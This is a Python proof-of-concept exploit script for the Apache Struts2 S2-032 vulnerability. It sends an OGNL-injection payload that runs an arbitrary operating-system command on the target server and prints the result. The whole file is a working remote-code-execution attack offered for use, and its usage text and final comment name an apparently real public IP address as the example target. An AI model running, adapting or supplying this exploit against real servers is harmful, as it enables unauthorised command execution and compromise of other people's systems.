#encodig:utf-8
__author__ = 'm0rk'

import requests
import sys


def poc(url,command):
    payload = "?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse" \
              "%28%29,%23res.setCharacterEncoding%28%23parameters.encoding[0]%29,%23w%3d%23res.getWriter%28%29,%23s%3dnew+java.util.Scanner%28@java.lang." \
              "Runtime@getRuntime%28%29.exec%28%23parameters.cmd[0]%29.getInputStream%28%29%29.useDelimiter%28%23parameters.pp[0]%29,%23str%3d%23s.hasNext" \
              "%28%29%3f%23s.next%28%29%3a%23parameters.ppp[0],%23w.print%28%23str%29,%23w.close%28%29,1?%23xx:%23request.toString&cmd="+command+"&pp=\\\\A&ppp=%20&encoding=UTF-8"
    url +=payload
    res = requests.get(url)
    if res.status_code == 200:
        print res.content
    else:
        print "[-]may not vulnerable!"


def Help():
    help='S2-032 V1.0 \n'
    help+='Usage:'+sys.argv[0] +' [url] + [command]\n'
    help+='example: python poc_s2-032.py http://202.96.191.219/erc/login.action  id\n'
    print help

def main():
    if len(sys.argv)!=3:
        Help()
        exit()
    poc(url=sys.argv[1],command=sys.argv[2])

if __name__ == '__main__':
    main()

#example python poc_s2-032.py http://202.96.191.219/erc/login.action  id